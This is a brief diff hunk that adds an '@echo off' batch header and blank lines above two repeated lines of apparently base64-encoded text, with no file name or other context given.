@@ -1,2 +1,5 @@
+
+@echo off
+
 V3AgkNghlwycNk4R6C0oAaN2HfQ406ljPCwM+WFZ9smV37SFm0fkxePCLHcspqk1cfuwXzioudeGG
 V3AgkNghlwycNk4R6C0oAaN2HfQ406ljPCwM+WFZ9smV37SFm0fkxePCLHcspqk1cfuwXzioudeGG
